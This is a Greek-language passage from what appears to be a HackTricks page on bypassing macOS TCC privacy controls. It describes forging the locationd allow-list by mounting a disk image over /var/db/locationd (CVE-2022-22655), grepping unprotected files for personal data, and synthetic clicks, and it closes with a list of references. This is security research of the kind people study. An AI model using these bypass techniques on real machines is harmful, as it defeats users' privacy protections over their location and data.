Οι Υπηρεσίες τοποθεσίας **δεν** αποθηκεύονται σε βάση δεδομένων TCC όπως οι υπόλοιπες υπηρεσίες. Η διαχείρισή τους γίνεται από το `locationd`, το οποίο διατηρεί τη δική του allow-list στο **`/var/db/locationd/clients.plist`**:<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Κάθε καταχώριση προσδιορίζεται από τον client (bundle ID ή executable path) και περιέχει πεδία όπως `Authorized`, `BundleId`, `Executable` και `Registered`.

Το ίδιο το αρχείο `clients.plist` προστατεύεται από το Sandbox/TCC και δεν μπορεί να τροποποιηθεί ακόμη και ως root — όμως ο κατάλογος **`/var/db/locationd/` δεν προστατευόταν από mounting**. Έτσι, ένας attacker με δικαιώματα root μπορούσε να δημιουργήσει ένα disk image που περιείχε το δικό του `clients.plist` (με το binary του σημειωμένο ως `Authorized`), να το προσαρτήσει πάνω από τον κατάλογο και να επανεκκινήσει το `locationd`, ώστε να ενεργοποιηθεί η πλαστογραφημένη allow-list.<sup>[5]</sup>

> [!TIP]
> Αυτό ακολουθεί το ίδιο μοτίβο με τα TCC bypasses μέσω `hdiutil`/`mount` παραπάνω: το *file* προστατεύεται, αλλά ο *directory* στον οποίο βρίσκεται όχι, επομένως αντικαθιστάτε ολόκληρο τον directory αντί για το file.

## Μέσω startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Μέσω grep

Σε αρκετές περιπτώσεις, αρχεία αποθηκεύουν ευαίσθητες πληροφορίες, όπως emails, αριθμούς τηλεφώνου, μηνύματα... σε μη προστατευμένες τοποθεσίες (κάτι που θεωρείται vulnerability στην Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Αυτό δεν λειτουργεί πλέον, αλλά [**λειτουργούσε στο παρελθόν**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ένας άλλος τρόπος με χρήση [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
